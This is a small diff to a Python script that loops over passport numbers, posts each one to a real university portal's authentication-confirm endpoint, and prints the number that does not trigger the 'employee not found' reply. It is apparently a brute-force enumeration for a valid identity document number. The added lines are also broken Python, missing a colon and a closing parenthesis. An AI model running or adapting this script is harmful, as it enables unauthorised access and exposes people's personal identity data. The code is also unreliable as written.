@@ -21,6 +21,8 @@ def main():
         client = requests.post('https://lk.misis.ru/ru/auth/confirm', body)
         if client.text.find("К сожалению нам не удалось найти сотрудника") == -1 or passport < 1:
             print(client.text)
+        if client.text.find("К сожалению нам не удалось найти сотрудника") == -1
+            print("\n\nfinal passport: {}".format(passport)
 
         passport = passport + 1
 
